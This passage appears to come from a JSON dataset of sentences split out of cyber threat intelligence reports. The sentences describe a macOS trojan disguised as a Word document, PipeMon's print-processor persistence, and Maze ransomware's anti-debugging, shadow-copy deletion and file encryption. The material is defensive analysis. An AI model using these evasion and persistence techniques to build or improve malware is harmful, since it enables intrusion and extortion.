        "text": "The following is an example request to the C2 from the \u201crequest_session_key\u201d routine.\n",
        "type": "",
        "report": "r-150",
        "line": 35,
        "index": 521
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S0",
        "text": "The malware is delivered as an application disguised as an MS Office Word doc.\n",
        "type": "",
        "report": "r-213",
        "line": 0,
        "index": 522
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S1",
        "text": "The previous research noted that the malware deploys a novel trick to prevent MS Office attempting to launch the disguised app as a doc by embedding a unicode character in the file name.",
        "type": "",
        "report": "r-213",
        "line": 1,
        "index": 523
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S2",
        "text": "This causes launch services to call \u201copen\u201d on the file rather than the default program for \u201c.doc\u201d.",
        "type": "",
        "report": "r-213",
        "line": 2,
        "index": 524
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S3",
        "text": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "type": "",
        "report": "r-213",
        "line": 3,
        "index": 525
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S4",
        "text": "After the bait and switch, this doc is launched and presented to the user.\n",
        "type": "",
        "report": "r-213",
        "line": 4,
        "index": 526
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S5",
        "text": "The whole trick is invisible to the user, who only sees a document appearing with the same name as the one they double-clicked on.",
        "type": "",
        "report": "r-213",
        "line": 5,
        "index": 527
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S6",
        "text": "Meanwhile, the second stage payload has been deposited in the /tmp folder and begins its run to install a hidden persistence agent and the third stage malicious executable.",
        "type": "",
        "report": "r-213",
        "line": 6,
        "index": 528
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S7",
        "text": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "type": "",
        "report": "r-213",
        "line": 7,
        "index": 529
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S8",
        "text": "Note line 4, which defines a variable with around 850Kb of base64-encoded data.",
        "type": "",
        "report": "r-213",
        "line": 8,
        "index": 530
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S9",
        "text": "At line 40, that data is piped through the base64 utility for decoding, dropped in a subfolder in the /tmp directory, given executable permissions via chmod , and then launched as the 2nd stage payload.\n",
        "type": "",
        "report": "r-213",
        "line": 9,
        "index": 531
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S10",
        "text": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "type": "",
        "report": "r-213",
        "line": 10,
        "index": 532
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S11",
        "text": "The former was a security feature brought in by Apple to prevent executables accessing external resources via relative paths and bypassing Gatekeeper checks.",
        "type": "",
        "report": "r-213",
        "line": 11,
        "index": 533
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S12",
        "text": "However, like Gatekeeper itself, App Translocation relies on the executable being tagged with the com.apple.quarantine bit.\n",
        "type": "",
        "report": "r-213",
        "line": 12,
        "index": 534
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S13",
        "text": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "type": "",
        "report": "r-213",
        "line": 13,
        "index": 535
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S14",
        "text": "The second stage payload, once dumped from the encoded base64, is a universal FAT binary containing Mach-Os for i386 and x86_64 architectures.",
        "type": "",
        "report": "r-213",
        "line": 14,
        "index": 536
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S15",
        "text": "The source code was written in C++.\n",
        "type": "",
        "report": "r-213",
        "line": 15,
        "index": 537
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S16",
        "text": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "type": "",
        "report": "r-213",
        "line": 16,
        "index": 538
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S17",
        "text": "However, we also note that this stage has code for testing the UID and determining whether the executable is being run as root or not.",
        "type": "",
        "report": "r-213",
        "line": 17,
        "index": 539
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S18",
        "text": "If so, the persistence mechanism is now written to /Library/LaunchDaemons instead of the user\u2019s Library LaunchAgents folder.\n",
        "type": "",
        "report": "r-213",
        "line": 18,
        "index": 540
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S19",
        "text": "In either case, the program argument is the same, pointing to a custom subfolder in the Library folder called \u201cUser Photos\u201d and an executable, mount_devfs , which is similarly a universal FAT binary containing Mach-Os written in C++.\n",
        "type": "",
        "report": "r-213",
        "line": 19,
        "index": 541
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S20",
        "text": "A further point not mentioned in the earlier research is that the Launch Agent or Launch Daemon is written using the \u201cHidden\u201d flag so that users won\u2019t see it in the Finder by default.\n",
        "type": "",
        "report": "r-213",
        "line": 20,
        "index": 542
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S21",
        "text": "According to the earlier research, the malicious \u201cmount_devfs\u201d file provides the actors with backdoor capabilities, which include the ability to exfiltrate information as well as download files to the target machine.",
        "type": "",
        "report": "r-213",
        "line": 21,
        "index": 543
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S22",
        "text": "For downloading, the actors make use of the same built-in dylib as we\u2019ve seen used by Lazarus APT, libcurl.4.dylib .\n",
        "type": "",
        "report": "r-213",
        "line": 22,
        "index": 544
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S23",
        "text": "The third stage payload has the ability to collect data regarding the device and its environment, including the computer host name.",
        "type": "",
        "report": "r-213",
        "line": 23,
        "index": 545
    },
    {
        "id": "cti_reports_filtered/r-213.md:::S24",
        "text": "Curiously, the sample has two hardcoded strings that presumably are meant as a \u201ccalling card\u201d or have some internal meaning to the malware developers:\n",
        "type": "",
        "report": "r-213",
        "line": 24,
        "index": 546
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S0",
        "text": "PipeMon\u2019s first stage consists of a password-protected RARSFX executable embedded in the .rsrc section of its launcher.",
        "type": "",
        "report": "r-233",
        "line": 0,
        "index": 547
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S1",
        "text": "The launcher writes the RARSFX to setup0.exe in a directory named with a randomly generated, eight-character, ASCII string located in the directory returned by GetTempPath.",
        "type": "",
        "report": "r-233",
        "line": 1,
        "index": 548
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S2",
        "text": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*\n",
        "type": "",
        "report": "r-233",
        "line": 2,
        "index": 549
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S3",
        "text": "Note that the password is different with each sample.\n",
        "type": "",
        "report": "r-233",
        "line": 3,
        "index": 550
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S4",
        "text": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:\n",
        "type": "",
        "report": "r-233",
        "line": 4,
        "index": 551
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S5",
        "text": "- CrLnc.dat \u2013 Encrypted payload\n",
        "type": "",
        "report": "r-233",
        "line": 5,
        "index": 552
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S6",
        "text": "- Duser.dll \u2013 Used for UAC bypass\n",
        "type": "",
        "report": "r-233",
        "line": 6,
        "index": 553
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S7",
        "text": "- osksupport.dll \u2013 Used for UAC bypass\n",
        "type": "",
        "report": "r-233",
        "line": 7,
        "index": 554
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S8",
        "text": "- PrintDialog.dll \u2013 Used for the malicious print processor initialization\n",
        "type": "",
        "report": "r-233",
        "line": 8,
        "index": 555
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S9",
        "text": "- PrintDialog.exe \u2013 Legitimate Windows executable used to load PrintDialog.dll\n",
        "type": "",
        "report": "r-233",
        "line": 9,
        "index": 556
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S10",
        "text": "- setup.dll \u2013 Installation DLL\n",
        "type": "",
        "report": "r-233",
        "line": 10,
        "index": 557
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S11",
        "text": "- setup.exe \u2013 Main executable\n",
        "type": "",
        "report": "r-233",
        "line": 11,
        "index": 558
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S12",
        "text": "Note that in the event of a folder name collision, the number at the end of the RarSFX0 string is incremented until a collision is avoided.",
        "type": "",
        "report": "r-233",
        "line": 12,
        "index": 559
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S13",
        "text": "Further, not all these files are necessarily present in the archive, depending on the installer.\n",
        "type": "",
        "report": "r-233",
        "line": 13,
        "index": 560
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S14",
        "text": "Once extracted, setup.exe is executed without arguments.",
        "type": "",
        "report": "r-233",
        "line": 14,
        "index": 561
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S15",
        "text": "Its sole purpose is to load setup.dll using LoadLibraryA.",
        "type": "",
        "report": "r-233",
        "line": 15,
        "index": 562
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S16",
        "text": "Once loaded, setup.dll checks whether an argument in the format \u2013x:n (where n is an integer) was provided; the mode of operation will be different depending on the presence of n. Supported arguments and their corresponding behavior are shown in Table 1.",
        "type": "",
        "report": "r-233",
        "line": 16,
        "index": 563
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S17",
        "text": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "type": "",
        "report": "r-233",
        "line": 17,
        "index": 564
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S18",
        "text": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:\n",
        "type": "",
        "report": "r-233",
        "line": 18,
        "index": 565
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S19",
        "text": "depending on the variant.",
        "type": "",
        "report": "r-233",
        "line": 19,
        "index": 566
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S20",
        "text": "Note that we weren\u2019t able to retrieve samples related to Interactive.dll.\n",
        "type": "",
        "report": "r-233",
        "line": 20,
        "index": 567
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S21",
        "text": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.\n",
        "type": "",
        "report": "r-233",
        "line": 21,
        "index": 568
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S22",
        "text": "The location where the malicious DLL is dropped was not chosen randomly.",
        "type": "",
        "report": "r-233",
        "line": 22,
        "index": 569
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S23",
        "text": "This is the path where Windows Print Processors are located and setup.dll registers the malicious DLL loader as an alternative Print Processor by setting one of the following registry values: HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\PrintFiiterPipelineSvc\\Driver = \u201cDEment.dll\u201d or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\lltdsvc1\\Driver = \u201cEntAppsvc.dll\u201d\n",
        "type": "",
        "report": "r-233",
        "line": 23,
        "index": 570
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S24",
        "text": "depending on the variant.",
        "type": "",
        "report": "r-233",
        "line": 24,
        "index": 571
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S25",
        "text": "Note the typo in PrintFiiterPipelineSvc (which has no impact on the Print Processor installation since any name can be used).\n",
        "type": "",
        "report": "r-233",
        "line": 25,
        "index": 572
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S26",
        "text": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "type": "",
        "report": "r-233",
        "line": 26,
        "index": 573
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S27",
        "text": "As a result, the malicious print process is loaded when the spooler service starts.",
        "type": "",
        "report": "r-233",
        "line": 27,
        "index": 574
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S28",
        "text": "Note that the Print Spooler service starts at each PC startup, which ensures persistence across system resets.",
        "type": "",
        "report": "r-233",
        "line": 28,
        "index": 575
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S29",
        "text": "This technique is really similar to the Print Monitor persistence technique (being used by DePriMon, for example) and, to our knowledge, has not been documented previously.\n",
        "type": "",
        "report": "r-233",
        "line": 29,
        "index": 576
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S30",
        "text": "Additionally, the encrypted payload, CrLnc.dat, extracted from the RARSFX is written to the registry at the following location, depending on the installer:\n",
        "type": "",
        "report": "r-233",
        "line": 30,
        "index": 577
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S31",
        "text": "This encrypted registry payload is then loaded, decrypted and executed by the previously registered Print Processor library.",
        "type": "",
        "report": "r-233",
        "line": 31,
        "index": 578
    },
    {
        "id": "cti_reports_filtered/r-233.md:::S32",
        "text": "The whole PipeMon staging and persistence is shown in Figure 1.\n",
        "type": "",
        "report": "r-233",
        "line": 32,
        "index": 579
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S0",
        "text": "Maze is a complex piece of malware that uses some tricks to frustrate analysis right from the beginning.",
        "type": "",
        "report": "r-261",
        "line": 0,
        "index": 580
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S1",
        "text": "The malware starts preparing some functions that appear to save memory addresses in global variables to use later in dynamic calls though it does not actually use these functions later.",
        "type": "",
        "report": "r-261",
        "line": 1,
        "index": 581
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S2",
        "text": "Whether it is residual code existing in the entry point of the malware or a trick to mislead researchers is up for debate.",
        "type": "",
        "report": "r-261",
        "line": 2,
        "index": 582
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S3",
        "text": "Later, the malware enters in a big block of trash code that also includes some elements to decrypt strings and important information for later.",
        "type": "",
        "report": "r-261",
        "line": 3,
        "index": 583
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S4",
        "text": "The malware uses some tricks to detect debuggers at this point.\n",
        "type": "",
        "report": "r-261",
        "line": 4,
        "index": 584
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S5",
        "text": "The most important of those are: A big use of the PEB field \u201cIsDebuggerPresent\u201d.",
        "type": "",
        "report": "r-261",
        "line": 5,
        "index": 585
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S6",
        "text": "This field is a Boolean field that is filled from Windows with 1 (True) if the application is running inside of a debugger or 0 (False) if it is not.",
        "type": "",
        "report": "r-261",
        "line": 6,
        "index": 586
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S7",
        "text": "If the malware detects a debugger it will remain in an infinite loop without making anything while wasting system resources.\n",
        "type": "",
        "report": "r-261",
        "line": 7,
        "index": 587
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S8",
        "text": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "type": "",
        "report": "r-261",
        "line": 8,
        "index": 588
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S9",
        "text": "Using the name of each process it makes a custom name with a custom algorithm, along with a hash that is checked against a hardcoded list.",
        "type": "",
        "report": "r-261",
        "line": 9,
        "index": 589
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S10",
        "text": "If the hash is found in this list the process will be terminated.",
        "type": "",
        "report": "r-261",
        "line": 10,
        "index": 590
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S11",
        "text": "For example, the process of the debugger \u201cx32dbg\u201d, is caught at this point:\n",
        "type": "",
        "report": "r-261",
        "line": 11,
        "index": 591
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S12",
        "text": "It can terminate IDA debugger, x32dbg, OllyDbg and more processes to avoid dynamic analysis, close databases, office programs and security tools.\n",
        "type": "",
        "report": "r-261",
        "line": 12,
        "index": 592
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S13",
        "text": "A partial list of the processes that can be cracked using a dictionary list terminated by the malware is shown below:\n",
        "type": "",
        "report": "r-261",
        "line": 13,
        "index": 593
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S14",
        "text": "This short list shows the name of the process to kill and the custom hash from the special name generated from the original process name.",
        "type": "",
        "report": "r-261",
        "line": 14,
        "index": 594
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S15",
        "text": "The malware will kill the process with the function \u201cTerminateProcess\u201d that it gets from the EAT (Export Address Table) of the module \u201ckernel32.dll\u201d to increase obfuscation, comparing the name with a custom hash taken from the name in high caps.\n",
        "type": "",
        "report": "r-261",
        "line": 15,
        "index": 595
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S16",
        "text": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "type": "",
        "report": "r-261",
        "line": 16,
        "index": 596
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S17",
        "text": "However, instead of calling it directly, it puts the parameters needed for the function on the stack, followed by a memory address with a \u201cpush\u201d opcode and then makes a direct jump to the Windows function.",
        "type": "",
        "report": "r-261",
        "line": 17,
        "index": 597
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S18",
        "text": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "type": "",
        "report": "r-261",
        "line": 18,
        "index": 598
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S19",
        "text": "An example of this can be seen in this image:\n",
        "type": "",
        "report": "r-261",
        "line": 19,
        "index": 599
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S20",
        "text": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].\n",
        "type": "",
        "report": "r-261",
        "line": 20,
        "index": 600
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S21",
        "text": "The trick used here is \u201cVirtualProtect\u201d to give the function memory address of \u201cDbgUIRemoteBreakin\u201d permission to write to it:\n",
        "type": "",
        "report": "r-261",
        "line": 21,
        "index": 601
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S22",
        "text": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.\n",
        "type": "",
        "report": "r-261",
        "line": 22,
        "index": 602
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S23",
        "text": "This is done to avoid having a debugger attach to it in runtime.",
        "type": "",
        "report": "r-261",
        "line": 23,
        "index": 603
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S24",
        "text": "This way, when a debugger attaches to the process internally, the system calls this function but, instead of creating a thread to start the debugging, the \u201cret\u201d opcode forces the function to return without creating it.",
        "type": "",
        "report": "r-261",
        "line": 24,
        "index": 604
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S25",
        "text": "In brief, it prevents a debugger from being attached correctly.",
        "type": "",
        "report": "r-261",
        "line": 25,
        "index": 605
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S26",
        "text": "It is done before enumerating the system process.\n",
        "type": "",
        "report": "r-261",
        "line": 26,
        "index": 606
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S27",
        "text": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.\n",
        "type": "",
        "report": "r-261",
        "line": 27,
        "index": 607
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S28",
        "text": "Maze creates a mutex with the name \u201cGlobal\\x\u201d where x is a special value that is unique per machine.",
        "type": "",
        "report": "r-261",
        "line": 28,
        "index": 608
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S29",
        "text": "For example, in the next screenshot (some information has been deleted to anonymize the machine used for the analysis) is an example of this behavior.",
        "type": "",
        "report": "r-261",
        "line": 29,
        "index": 609
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S30",
        "text": "It is done to avoid two or more executions at the same time.",
        "type": "",
        "report": "r-261",
        "line": 30,
        "index": 610
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S31",
        "text": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:\n",
        "type": "",
        "report": "r-261",
        "line": 31,
        "index": 611
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S32",
        "text": "- 0x05 -> ERROR_ACCESS_DENIED.",
        "type": "",
        "report": "r-261",
        "line": 32,
        "index": 612
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S33",
        "text": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "type": "",
        "report": "r-261",
        "line": 33,
        "index": 613
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S34",
        "text": "- 0xb7 -> ERROR_ALREADY_EXISTS.",
        "type": "",
        "report": "r-261",
        "line": 34,
        "index": 614
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S35",
        "text": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.\n",
        "type": "",
        "report": "r-261",
        "line": 35,
        "index": 615
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S36",
        "text": "If either of the above occur, the malware remains in execution but does not crypt any files in the system or use any resources of the machine.",
        "type": "",
        "report": "r-261",
        "line": 36,
        "index": 616
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S37",
        "text": "It means that it will appear in the program list using 0% of the processor.\n",
        "type": "",
        "report": "r-261",
        "line": 37,
        "index": 617
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S38",
        "text": "The mutex value changes either per sample or on a periodic basis to avoid the possibility of vaccines being made against it.",
        "type": "",
        "report": "r-261",
        "line": 38,
        "index": 618
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S39",
        "text": "The malware also has a command to avoid the \u2018problem\u2019 of vaccines which will be explained later.",
        "type": "",
        "report": "r-261",
        "line": 39,
        "index": 619
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S40",
        "text": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).\n",
        "type": "",
        "report": "r-261",
        "line": 40,
        "index": 620
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S41",
        "text": "The checks are done in an obfuscated way within the jumble of the code that the malware has (in the virtual machine used here the Spanish language of Spain (es-ES) was used; it is the code 0xC0A that appears in the stack in the screenshot):\n",
        "type": "",
        "report": "r-261",
        "line": 41,
        "index": 621
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S42",
        "text": "If the language matches any of those in the list below, the malware will clean the memory and exit the main thread without wasting any resources or making any files.\n",
        "type": "",
        "report": "r-261",
        "line": 42,
        "index": 622
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S43",
        "text": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "type": "",
        "report": "r-261",
        "line": 43,
        "index": 623
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S44",
        "text": "Prior to this, the malware gets the function of \u201cWoW64DisableWow64FsRedirection\u201d with \u201cGetProcAddress\u201d and uses it to avoid redirection by default in 64-bit operating systems and calls it in a dynamic way.\n",
        "type": "",
        "report": "r-261",
        "line": 44,
        "index": 624
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S45",
        "text": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.\n",
        "type": "",
        "report": "r-261",
        "line": 45,
        "index": 625
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S46",
        "text": "This execution is done with the function \u201cCreateProcessW\u201d but, to increase the level of obfuscation, the malware is launched with this command:\n",
        "type": "",
        "report": "r-261",
        "line": 46,
        "index": 626
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S47",
        "text": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "type": "",
        "report": "r-261",
        "line": 47,
        "index": 627
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S48",
        "text": "It enters these folders but then promptly exits them using the command \u201c..\u201d, meaning it returns to the previous folder in the path.\n",
        "type": "",
        "report": "r-261",
        "line": 48,
        "index": 628
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S49",
        "text": "For example, in the beginning it enters the folders \u201cydw\u201d and \u201cfdygg\u201d but later returns to the root of the Windows installation unit with two \u201c..\u201d commands that lead to \u201cC:\\\u201d in this case.",
        "type": "",
        "report": "r-261",
        "line": 49,
        "index": 629
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S50",
        "text": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "type": "",
        "report": "r-261",
        "line": 50,
        "index": 630
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S51",
        "text": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "type": "",
        "report": "r-261",
        "line": 51,
        "index": 631
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S52",
        "text": "It is important to understand that this \u201cpath\u201d used in the command with non-existent folders is random and does not need to use the same number of folders to make the obfuscation.",
        "type": "",
        "report": "r-261",
        "line": 52,
        "index": 632
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S53",
        "text": "After the deletion process, the malware gets the function \u201cWow64RevertWow64FsRedirection\u201d using the function \u201cGetProcAddress\u201d and calls it in a dynamic way to leave the system in the same state as before.\n",
        "type": "",
        "report": "r-261",
        "line": 53,
        "index": 633
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S54",
        "text": "Maze affects network resources too, using the functions \u201cWNetOpenEnumW\u201d, \u201cWNetEnumResourceW\u201d, \u201cWNetCloseEnum\u201d and \u201cWNetAddConnection2W\u201d.",
        "type": "",
        "report": "r-261",
        "line": 54,
        "index": 634
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S55",
        "text": "The malware uses two algorithms to crypt the files, ChaCha which is based on the Salsa20 algorithm that is symmetric and, for protection, an RSA algorithm that is asymmetric\n",
        "type": "",
        "report": "r-261",
        "line": 55,
        "index": 635
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S56",
        "text": "In each execution the malware creates a Public BLOB of one RSA key that will be used to crypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information crypted with the public RSA blob created previously.",
        "type": "",
        "report": "r-261",
        "line": 56,
        "index": 636
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S57",
        "text": "Just like other ransomware, this malware has an RSA Public BLOB embedded that will be imported to protect the RSA private BLOB of the victim.",
        "type": "",
        "report": "r-261",
        "line": 57,
        "index": 637
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S58",
        "text": "Only the malware developers have the RSA private blob to decrypt their public RSA Blob.\n",
        "type": "",
        "report": "r-261",
        "line": 58,
        "index": 638
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S59",
        "text": "This key is protected with a crypto using a key of 32 bits and iv of 8 bytes using the function \u201cCryptGenRandom\u201d to avoid memory dumps but, later, it will need to be decrypted before use.\n",
        "type": "",
        "report": "r-261",
        "line": 59,
        "index": 639
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S60",
        "text": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "type": "",
        "report": "r-261",
        "line": 60,
        "index": 640
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S61",
        "text": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.\n",
        "type": "",
        "report": "r-261",
        "line": 61,
        "index": 641
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S62",
        "text": "An example ransom note, with some data anonymized, is shown below:\n",
        "type": "",
        "report": "r-261",
        "line": 62,
        "index": 642
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S63",
        "text": "The procedure to crypt the files is easy, with the malware taking the following steps:\n",
        "type": "",
        "report": "r-261",
        "line": 63,
        "index": 643
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S64",
        "text": "- Check the existence of the file with the function \u201cSetFileAttributesW\u201d with the attribute \u201cFILE_ATTRIBUTE_ARCHIVE\u201d.\n",
        "type": "",
        "report": "r-261",
        "line": 64,
        "index": 644
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S65",
        "text": "- Reserve memory to the file with a call to \u201cVirtual Alloc\u201d for the key and iv.\n",
        "type": "",
        "report": "r-261",
        "line": 65,
        "index": 645
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S66",
        "text": "- Open the file with read and write permissions with the function \u201cCreateFileW\u201d with the flag \u201cOPEN_EXISTING\u201d.\n",
        "type": "",
        "report": "r-261",
        "line": 66,
        "index": 646
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S67",
        "text": "- Get the file size with the function \u201cGetFileSizeEx\u201d (it is important for managing big files, \u201cGetFileSize\u201d is not good for bigger files).\n",
        "type": "",
        "report": "r-261",
        "line": 67,
        "index": 647
    },
    {
